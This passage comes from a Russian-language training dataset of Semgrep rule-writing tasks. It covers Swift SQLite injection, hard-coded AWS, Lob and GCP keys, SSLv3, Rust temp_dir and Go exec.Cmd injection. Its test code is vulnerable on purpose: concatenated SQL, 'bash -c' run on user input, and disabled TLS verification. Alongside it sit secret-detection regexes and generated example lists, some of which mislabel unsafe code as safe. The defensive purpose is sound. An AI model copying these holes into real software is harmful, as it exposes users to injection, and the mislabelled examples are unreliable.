меньшее_значение больше нуля. Безопасным является использование indexOf с параметром -1 или проверка включения значения методом contains.\n\n# Ключевые элементы:\n- ID: positive-number-index-of\n- Язык: scala \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "positive-number-index-of",
      "language": "scala",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: swift-potential-sqlite-injection\nОписание уязвимости: Potential Client-side SQL injection which has different impacts depending on the SQL use-case. The impact may include the circumvention of local authentication mechanisms, obtaining of sensitive data from the app, or manipulation of client-side behavior. It wasn't possible to make certain that the source is untrusted, but the application should avoid concatenating dynamic data into SQL queries and should instead leverage parameterized queries.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: swift\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: swift\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: sqllite-injection-audit.swift\nlet username = someField.text()\nlet password = a.text()\n\nlet sql = \"SELECT * FROM semgrep_users WHERE username = '\\(username)' AND password = '\\(password)'\"\n\n// ruleid:swift-potential-sqlite-injection\nlet result = sqlite3_exec(db, sql, nil, nil, nil)\nsqlite3_close(db)\n\nlet sql = \"SELECT * FROM semgrep_users WHERE username = 'admin' AND password = '\\(password)'\"\n// ruleid:swift-potential-sqlite-injection\nlet result = sqlite3_exec(db, sql, nil, nil, nil)\nsqlite3_close(db)\n\n\nlet sql = \"SELECT * FROM semgrep_users WHERE username = ? AND password = ?\"\nvar stmt: OpaquePointer?\n// okid:swift-potential-sqlite-injection\nif sqlite3_prepare_v2(db, sql, -1, &stmt, nil) == SQLITE_OK {\n    sqlite3_bind_text(stmt, 1, username, -1, nil)\n    sqlite3_bind_text(stmt, 2, password, -1, nil)\n    if sqlite3_step(stmt) == SQLITE_DONE {\n        // SUCCESS\n    }\n}\n\nsqlite3_finalize(stmt)\nsqlite3_close(db)\n\nlet sql = \"SELECT * FROM semgrep_users WHERE username = 'admin' AND password = 'admin'\"\n// okid:swift-potential-sqlite-injection\nlet result = sqlite3_exec(db, sql, nil, nil, nil)\nsqlite3_close(db)\n\n\nlet theUsername = \"admin\"\nlet sql = \"SELECT * FROM semgrep_users WHERE username = '\" + theUsername + \"' AND password = 'admin'\"\n// FP but cant do much about this I dont think\n// ruleid:swift-potential-sqlite-injection\nlet result = sqlite3_exec(db, sql, nil, nil, nil)\nsqlite3_close(db)\n\nlet newUser = getUsernameFromServer()\nlet sql = \"SELECT * FROM semgrep_users WHERE username = '\" + newUser + \"' AND password = 'admin'\"\n// ruleid:swift-potential-sqlite-injection\nlet result = sqlite3_exec(db, sql, nil, nil, nil)\nsqlite3_close(db)\n\n\nlet sql = \"SELECT * FROM semgrep_users WHERE username = 'admin' AND password = '\" + password + \"'\"\n// ruleid:swift-potential-sqlite-injection\nlet result = sqlite3_exec(db, sql, nil, nil, nil)\nsqlite3_close(db)\n\n\nlet sql = \"SELECT * FROM semgrep_users WHERE username = ? AND password = '\" + password + \"'\"\n// ruleid:swift-potential-s  # Ограничиваем длину\n\nОпасные паттерны:\n• let sql = \"SELECT * FROM semgrep_users WHERE username = 'admin' AND password = '\" + password + \"'\"\n• let sql = \"SELECT * FROM semgrep_users WHERE username = '\" + newUser + \"' AND password = 'admin'\n• let sql = \"SELECT * FROM semgrep_users WHERE username = '?\" + password + \"'\n\nБезопасные паттерны:  \n• let sql = \"SELECT * FROM semgrep_users WHERE username = ? AND password = ?\"\n• let sql = \"SELECT * FROM semgrep_users WHERE username = 'admin' AND password = 'admin'\n• let sql = \"SELECT * FROM semgrep_users WHERE username = 'admin' AND password = '\" + password + \"'\n\nЛегенда аннотаций:\n- // ruleid:swift-potential-sqlite-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:swift-potential-sqlite-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: swift-potential-sqlite-injection\n  message: >-\n    Potential Client-side SQL injection which has different impacts depending on the SQL use-case. The\n    impact may include the circumvention of local authentication mechanisms, obtaining of sensitive data\n    from the app, or manipulation of client-side behavior. It wasn't possible to make certain that the\n    source is untrusted, but the application should avoid concatenating dynamic data into SQL queries\n    and should instead leverage parameterized queries.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: LOW\n    category: security\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    masvs:\n    - 'MASVS-CODE-4: The app validates and sanitizes all untrusted inputs.'\n    references:\n    - https://developer.apple.com/library/archive/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html\n    subcategory:\n    - vuln\n    technology:\n    - ios\n    - macos\n  languages:\n  - swift\n  mode: taint\n  pattern-sources:\n  - pattern-either:\n    - pattern: |\n        \"...\\($X)...\"\n    - pattern: |\n        $SQL = \"...\" + $X\n    - pattern: |\n        $SQL = $X + \"...\"\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: sqlite3_exec($DB, $SQL, ...)\n      - pattern: sqlite3_prepare_v2($DB, $SQL, ...)\n    - focus-metavariable:\n      - $SQL\n\n\n# Логика правила:\n['Тип анализа: taint analysis', 'Источники (sources): динамические данные, объединяемые с SQL-запросами через конкатенацию строк', 'Синки (sinks): вызовы функций sqlite3_exec и sqlite3_prepare_v2, принимающие SQL-запросы в виде строк', 'Структура паттернов: используются два типа паттернов sources для поиска конкатенации динамических данных ($X) с SQL-запросом ($SQL)', 'Комбинация условий: используется оператор ИЛИ для охвата обоих типов конкатенаций', 'Механизм сопоставления: поиск конкатенации динамического значения ($X) с SQL-запросом ($SQL)']\n\n# Ключевые элементы:\n- ID: swift-potential-sqlite-injection\n- Язык: swift \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "swift-potential-sqlite-injection",
      "language": "swift",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: detected-aws-account-id\nОписание уязвимости: AWS Account ID detected. While not considered sensitive information, it is important to use them and share them carefully. For that reason it would be preferrable avoiding to hardcoded it here. Instead, read the value from an environment variable or keep the value in a separate, private file.\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: detected-aws-account-id.txt\n# ruleid: detected-aws-account-id\naws_account_id = 287139315271\n\n# ruleid: detected-aws-account-id\naws_account_id:287139315271\n\n{\n    \"version\": \"0\",\n    \"id\": \"a76750eb-b69f-ae47-b183-4d3cb0700618\",\n    \"detail-type\": \"AWS API Call via CloudTrail\",\n    \"source\": \"aws.s3\",\n    # ruleid: detected-aws-account-id\n    \"account\": \"287139315271\",\n    \"time\": \"2018-05-22T12:44:24Z\",\n    \"region\": \"us-east-1\",\n    \"resources\": [],\n    \"detail\": {\n       \"eventVersion\": \"1.05\",\n       \"userIdentity\": {},\n       \"eventTime\": \"2018-05-22T12:44:24Z\",\n       \"eventSource\": \"s3.amazonaws.com\",\n       \"eventName\": \"DeleteBucket\",\n       \"awsRegion\": \"us-east-1\",\n       \"sourceIPAddress\": \"209.6.231.175\",\n       \"userAgent\": \"[S3Console/0.4, aws-internal/3]\",\n       \"requestParameters\": {},\n       \"responseElements\": null,\n       \"additionalEventData\": {\n          \"vpcEndpointId\": \"vpce-6d72a204\"\n       },\n       \"requestID\": \"51A7870C114C931C\",\n       \"eventID\": \"d687e2af-5a29-4acb-bc41-6892b36420bf\",\n       \"eventType\": \"AwsApiCall\",\n       \"vpcEndpointId\": \"vpce-6d72a204\"\n    }\n}\n\nMappings:\n  ElbService:\n    # https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-access-logs.html#access-logging-bucket-permissions\n    us-east-1:\n      # ruleid: detected-aws-account-id\n      AccountId: \"287139315271\"\n\n# ruleid: detected-aws-account-id\naws_account_id = \"287139315271\"\n\naws s3api put-bucket-inventory-configuration \\\n              --bucket my-bucket \\\n              --id 2 \\\n# ruleid: detected-aws-account-id\n              --inventory-configuration '{\"Destination\": { \"S3BucketDestination\": { \"AccountId\": \"287139315271\", \"Bucket\": \"arn:aws:s3:::my-bucket\", \"Format\": \"CSV\" }}, \"IsEnabled\": true, \"Id\": \"2\", \"IncludedObjectVersions\": \"Current\", \"Schedule\": { \"Frequency\": \"Daily\" }}'\n\n\n# ok: detected-aws-account-id\naws_account_id_fake:123456789012123  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: detected-aws-account-id.txt\n# ruleid: detected-aws-account-id\naws_account_id = 287139315271\n• # ruleid: detected-aws-account-id\naws_account_id:287139315271\n• aws s3api put-bucket-inventory-configuration \\\n              --bucket my-bucket \\\n              --id 2 \\\n# ruleid: detected-aws-account-id\n              --inventory-configuration '{\"Destination\": { \"S\n\nБезопасные паттерны:  \n• // File: detected-aws-account-id.txt\n# ok: detected-aws-account-id\naws_account_id_fake:123456789012123\n• aws_account_id = \"287139315271\"\n# safe: detected-aws-account-id, значение взято из внешней среды или файла конфигурации\n\nЛегенда аннотаций:\n- // ruleid:detected-aws-account-id: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-aws-account-id: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detected-aws-account-id\n    patterns:\n      - pattern-either:\n          - pattern: |\n              $ACCOUNT_ID = $SECRET\n          - pattern: |\n              $ACCOUNT_ID : $SECRET\n          - pattern: |\n              $ACCOUNT_ID => $SECRET\n          - pattern: |\n              $ACCOUNT_ID = \"$SECRET\"\n          - pattern: |\n              $ACCOUNT_ID : \"$SECRET\"\n          - pattern: |\n              $ACCOUNT_ID => \"$SECRET\"\n          - pattern: |\n              \"$ACCOUNT_ID\" = \"$SECRET\"\n          - pattern: |\n              \"$ACCOUNT_ID\" : \"$SECRET\"\n          - pattern: |\n              \"$ACCOUNT_ID\" => \"$SECRET\"\n      - metavariable-analysis:\n          metavariable: $SECRET\n          analyzer: entropy\n      - metavariable-regex:\n          metavariable: $SECRET\n          regex: ^((?!(12345|0000).*)[0-9]{12})$\n      - metavariable-regex:\n          metavariable: $ACCOUNT_ID\n          regex: (AWS|aws|Aws)?_?(ACCOUNT|account|Account)_?(ID|id|Id)?(\"|')?\n    languages:\n      - generic\n    message: AWS Account ID detected. While not considered sensitive information, it is important\n      to use them and share them carefully. For that reason it would be preferrable avoiding to\n      hardcoded it here. Instead, read the value from an environment variable or\n      keep the value in a separate, private file.\n    severity: INFO\n    metadata:\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      source-rule-url: https://github.com/grab/secret-scanner/blob/master/scanner/signatures/pattern.go\n      category: security\n      technology:\n        - secrets\n        - aws\n      confidence: LOW\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n      cwe2022-top25: true\n      cwe2021-top25: true\n      subcategory:\n        - audit\n      likelihood: LOW\n      impact: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных идентификаторов AWS-аккаунтов ($ACCOUNT_ID) в различных форматах, таких как переменные, строковые литералы или ключевые значения. Оно использует комбинацию регулярных выражений и метапеременных для выявления возможных идентификаторов AWS-аккаунта, которые не должны быть жестко закодированы в исходном коде. Правило также проверяет наличие секретных значений с использованием анализа энтропии и регулярного выражения, соответствующего формату AWS-аккаунта.\n\n# Ключевые элементы:\n- ID: detected-aws-account-id\n- Язык: generic \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detected-aws-account-id",
      "language": "generic",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: lob-api-key\nОписание уязвимости: A gitleaks lob-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: lob-api-key.go\n// ruleid: lob-api-key\nlob_api_token = \"test_f39d44d63bd97652886ec2233845cf3600b\"\nlob_api_token = \"test_pub_b0bc63b31010f16eec74e98ff69aed9\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: lob-api-key.go\n// ruleid: lob-api-key\nlob_api_token = \"test_f39d44d63bd97652886ec2233845cf3600b\"\n• // File: another_file.go\n// ruleid: lob-api-key\nvar apiKey string = \"test_live_abc123def456ghijklmnopqrstuvwx\"\n\nБезопасные паттерны:  \n• // File: safe_code.go\napiToken := os.Getenv(\"LOB_API_KEY\")\n• // File: secure_code.go\nsecretManager.GetSecret(\"LOB_API_KEY\", &apiToken)\n\nЛегенда аннотаций:\n- // ruleid:lob-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:lob-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: lob-api-key\n  message: A gitleaks lob-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:lob)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}((live|test)_[a-f0-9]{35})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов API LOB в исходном коде. Оно ищет строку, начинающуюся с 'lob', за которой следуют произвольные символы длиной от 0 до 20, затем символ пробела или кавычки, после чего идет оператор присваивания или сравнения ('=', ':', '<', '>') и далее строка, состоящая из префиксов 'live_' или 'test_' и 35 шестнадцатеричных символов. Это соответствует типичному формату токена API LOB.\n\n# Ключевые элементы:\n- ID: lob-api-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "lob-api-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-api-key\nОписание уязвимости: A gitleaks gcp-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: gcp-api-key.go\n// ruleid: gcp-api-key\ngcp_api_token = \"AIza9xk6puR24zxE7aIiv1pzH4N4jHXiOYP9EQ3\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: gcp-api-key.go\n// ruleid: gcp-api-key\ngcp_api_token = \"AIza9xk6puR24zxE7aIiv1pzH4N4jHXiOYP9EQ3\"\n• // File: another_gcp_key.go\n// ruleid: gcp-api-key\ngcp_access_token = 'AIza9xk6puR24zxE7aIiv1pzH4N4jHXiOYP9EQ3'\n• // File: yet_another_gcp.go\n// ruleid: gcp-api-key\ngcp_auth_token = AIza9xk6puR24zxE7aIiv1pzH4N4jHXiOYP9EQ3\n\nБезопасные паттерны:  \n• // File: safe_gcp.go\ngcp_api_token := os.Getenv(\"GOOGLE_API_KEY\")\n• // File: secure_gcp.go\ngcp_access_token := getSecureCredential()\n• // File: no_gcp.go\nvar gcp_api_token string\n\nЛегенда аннотаций:\n- // ruleid:gcp-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-api-key\n  message: A gitleaks gcp-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(AIza[0-9A-Za-z\\\\-_]{35})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных GCP API ключей в исходном коде. Оно ищет строку, начинающуюся с 'AIza' и состоящую из 35 символов, которые могут быть буквами верхнего или нижнего регистра, цифрами, дефисами или подчеркиваниями. Регулярное выражение настроено так, чтобы соответствовать всем возможным разделителям строк, таким как одинарные и двойные кавычки, символы новой строки, переноса строки и пробелы. Правило применимо только к языкам, поддерживающим регулярные выражения.\n\n# Ключевые элементы:\n- ID: gcp-api-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "gcp-api-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: ssl-v3-is-insecure\nОписание уязвимости: SSLv3 is insecure because it has known vulnerabilities. Starting with go1.14, SSLv3 will be removed. Instead, use 'tls.VersionTLS13'.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: ssl.go\npackage main\n\nimport (\n\t\"crypto/tls\"\n\t\"log\"\n\t\"net/http\"\n\t\"net/http/httptest\"\n\t\"os\"\n)\n\n// zeroSource is an io.Reader that returns an unlimited number of zero bytes.\ntype zeroSource struct{}\n\nfunc (zeroSource) Read(b []byte) (n int, err error) {\n\tfor i := range b {\n\t\tb[i] = 0\n\t}\n\n\treturn len(b), nil\n}\n\nfunc main() {\n\t// Dummy test HTTP server for the example with insecure random so output is\n\t// reproducible.\n\tserver := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))\n\tserver.TLS = &tls.Config{\n\t\tRand: zeroSource{}, // for example only; don't do this.\n\t}\n\tserver.StartTLS()\n\tdefer server.Close()\n\n\t// Typically the log would go to an open file:\n\t// w, err := os.OpenFile(\"tls-secrets.txt\", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)\n\tw := os.Stdout\n\n\tclient := &http.Client{\n\t\tTransport: &http.Transport{\n\t\t\t// ruleid: ssl-v3-is-insecure\n\t\t\tTLSClientConfig: &tls.Config{\n\t\t\t\tKeyLogWriter:       w,\n\t\t\t\tMinVersion:         tls.VersionSSL30,\n\t\t\t\tRand:               zeroSource{}, // for reproducible output; don't do this.\n\t\t\t\tInsecureSkipVerify: true,         // test server certificate is not trusted.\n\t\t\t},\n\t\t},\n\t}\n\tresp, err := client.Get(server.URL)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to get URL: %v\", err)\n\t}\n\tresp.Body.Close()\n\n\tclient_good := &http.Client{\n\t\tTransport: &http.Transport{\n\t\t\tTLSClientConfig: &tls.Config{\n\t\t\t\tKeyLogWriter: w,\n\t\t\t\t// OK\n\t\t\t\tMinVersion:         tls.VersionTLS10,\n\t\t\t\tRand:               zeroSource{}, // for reproducible output; don't do this.\n\t\t\t\tInsecureSkipVerify: true,         // test server certificate is not trusted.\n\t\t\t},\n\t\t},\n\t}\n\tresp, err := client.Get(server.URL)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to get URL: %v\", err)\n\t}\n\tresp.Body.Close()\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• client := &http.Client{\n\tTransport: &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tMinVersion: tls.VersionSSL30,\n\t\t},\n\t},\n}\n• server := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { }))\nserver.TLS = &tls.Config{\n\tMinVersion: tls.VersionSSL30,\n}\n• config := &tls.Config{\n\tMinVersion: tls.VersionSSL30,\n}\n\nБезопасные паттерны:  \n• client := &http.Client{\n\tTransport: &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tMinVersion: tls.VersionTLS12,\n\t\t},\n\t},\n}\n• server := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { }))\nserver.TLS = &tls.Config{\n\tMinVersion: tls.VersionTLS12,\n}\n• config := &tls.Config{\n\tMinVersion: tls.VersionTLS12,\n}\n\nЛегенда аннотаций:\n- // ruleid:ssl-v3-is-insecure: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ssl-v3-is-insecure: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ssl-v3-is-insecure\n  message: >-\n    SSLv3 is insecure because it has known vulnerabilities.\n    Starting with go1.14, SSLv3 will be removed. Instead, use\n    'tls.VersionTLS13'.\n  metadata:\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://github.com/securego/gosec/blob/master/rules/tls_config.go\n    references:\n    - https://golang.org/doc/go1.14#crypto/tls\n    - https://www.us-cert.gov/ncas/alerts/TA14-290A\n    category: security\n    technology:\n    - go\n    confidence: HIGH\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: LOW\n  languages: [go]\n  severity: WARNING\n  fix-regex:\n    regex: VersionSSL30\n    replacement: VersionTLS13\n  pattern: 'tls.Config{..., MinVersion: $TLS.VersionSSL30, ...}'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования протокола SSLv3 в конфигурации TLS клиента или сервера. Протокол SSLv3 считается небезопасным из-за известных уязвимостей и был официально удален начиная с Go 1.14. Правило использует шаблон поиска структуры 'tls.Config' с полем 'MinVersion', установленным в значение 'VersionSSL30'. Это значение является константой, определенной в пакете 'tls' и соответствует версии SSLv3.\n\n# Ключевые элементы:\n- ID: ssl-v3-is-insecure\n- Язык: go \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ssl-v3-is-insecure",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения temp-dir\nОписание уязвимости: temp_dir should not be used for security operations. From the docs: 'The temporary directory may be shared among users, or between processes with different privileges; thus, the creation of any files or directories in the temporary directory must use a secure method to create a uniquely named file. Creating a file or directory with a fixed or predictable name may result in “insecure temporary file” security vulnerabilities.'\nCWE: C\nТип анализа: search\nЯзык: rust",
    "input": "Требования:\n- Язык: rust\n- Тип анализа: search\n- CWE: C\n- Серьезность: INFO\n\nКонтекст кода:\n// File: temp-dir.rs\nuse std::env;\n\n// ruleid: temp-dir\nlet dir = env::temp_dir();  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: temp-dir-dangerous.rs\nuse std::env;\nlet dir = env::temp_dir();\nstd::fs::create_file(dir.join(\"test.txt\"));\n• // File: temp-dir-dangerous2.rs\nuse std::env;\nlet dir = env::temp_dir().to_path_buf();\nstd::fs::create_dir(dir.join(\".hidden\"));\n\nБезопасные паттерны:  \n• // File: temp-dir-safe.rs\nuse std::env;\nallowed_function(); // Function that creates unique and secure filenames\nlet dir = env::temp_dir();\n• // File: temp-dir-safe2.rs\nuse std::env;\nallowed_function(); // Secure way to create a file\nlet dir = env::temp_dir();\nstd::fs::create_file(dir.join(\"unique_name\"));\n\nЛегенда аннотаций:\n- // ruleid:temp-dir: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:temp-dir: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: temp-dir\n    message: >-\n      temp_dir should not be used for security operations. From the docs:\n      'The temporary directory may be shared among users, or between processes\n      with different privileges; thus, the creation of any files or directories\n      in the temporary directory must use a secure method to create a uniquely\n      named file. Creating a file or directory with a fixed or predictable name\n      may result in “insecure temporary file” security vulnerabilities.'\n    pattern: \"std::env::temp_dir()\"\n    metadata:\n      references:\n        - https://doc.rust-lang.org/stable/std/env/fn.temp_dir.html\n      technology:\n        - rust\n      category: security\n      cwe: \"CWE-807: Reliance on Untrusted Inputs in a Security Decision\"\n      confidence: HIGH\n      likelihood: LOW\n      impact: LOW\n      subcategory: audit\n    languages: [rust]\n    severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции std::env::temp_dir() в Rust-коде. Функция temp_dir возвращает временный каталог, который может быть общим среди пользователей или процессов с разными привилегиями. Использование этого каталога напрямую для создания файлов или директорий небезопасно, так как оно не гарантирует уникальность имен создаваемых объектов. Правило ищет точное совпадение вызова функции temp_dir(), что позволяет обнаружить потенциальную угрозу безопасности.\n\n# Ключевые элементы:\n- ID: temp-dir\n- Язык: rust \n- Тип: a\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "temp-dir",
      "language": "rust",
      "severity": "INFO",
      "rule_type": "a",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dangerous-exec-cmd\nОписание уязвимости: Detected non-static command inside exec.Cmd. Audit the input to 'exec.Cmd'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-exec-cmd.go\npackage main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n)\n\nfunc test1(userInput string) {\n\n    cmdPath,_ := userInput;\n\n    // ruleid:dangerous-exec-cmd\n    cmd := &exec.Cmd {\n        Path: cmdPath,\n        Args: []string{ \"foo\", \"bar\" },\n        Stdout: os.Stdout,\n        Stderr: os.Stdout,\n    }\n\n    cmd.Start();\n\n}\n\nfunc test2(userInput string) {\n\n    cmdPath,_ := exec.LookPath(\"foo\");\n\n    // ruleid:dangerous-exec-cmd\n    cmd := &exec.Cmd {\n        Path: cmdPath,\n        Args: []string{ userInput, \"bar\" },\n        Stdout: os.Stdout,\n        Stderr: os.Stdout,\n    }\n\n    cmd.Start();\n\n}\n\nfunc test3(userInput string) {\n\n    cmdPath,_ := exec.LookPath(\"bash\");\n\n    // ruleid:dangerous-exec-cmd\n    cmd := &exec.Cmd {\n        Path: cmdPath,\n        Args: []string{ cmdPath, \"-c\", userInput },\n        Stdout: os.Stdout,\n        Stderr: os.Stdout,\n    }\n\n    cmd.Start();\n\n}\n\nfunc test4(userInput string) {\n\n    cmdPath,_ := exec.LookPath(\"bash\");\n\n    args = []string{ cmdPath, \"-c\", userInput }\n\n    // ruleid:dangerous-exec-cmd\n    cmd := &exec.Cmd {\n        Path: cmdPath,\n        Args: args,\n        Stdout: os.Stdout,\n        Stderr: os.Stdout,\n    }\n\n    cmd.Start();\n\n}\n\nfunc okTest1(userInput string) {\n\n    cmdPath,_ := exec.LookPath(\"go\");\n\n    // ok:dangerous-exec-cmd\n    cmd := &exec.Cmd {\n        Path: cmdPath,\n        Args: []string{ cmdPath, \"bar\" },\n        Stdout: os.Stdout,\n        Stderr: os.Stdout,\n    }\n\n    cmd.Start();\n\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• cmdPath,_ := userInput; ... cmd := &exec.Cmd {... Path: cmdPath, ...}\n• cmdPath,_ := exec.LookPath(\"foo\"); ... cmd := &exec.Cmd {... 